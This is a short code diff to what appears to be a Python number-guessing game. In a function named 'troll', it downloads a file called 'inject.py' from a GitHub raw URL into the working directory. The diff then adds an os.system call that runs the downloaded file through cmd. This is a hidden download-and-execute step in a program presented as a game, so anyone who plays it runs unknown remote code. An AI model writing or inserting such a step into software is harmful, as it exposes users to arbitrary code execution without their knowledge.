@@ -98,12 +98,13 @@ def main():
         clear()
 
     def troll():
-        import os, urllib.request
+        import os, urllib.request, pathlib
         dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/inject.py'
-        home = os.path.expanduser("~")
-        path = home + '\inject.py'
+        home = pathlib.Path.cwd()   #os.path.expanduser("~")
+        path = str(home) + '\inject.py'
         urllib.request.urlretrieve(dlurl, '{}'.format(path))
-        print(path)
+        os.system('cmd /c "inject.py"')
+        
             
 
     def game():
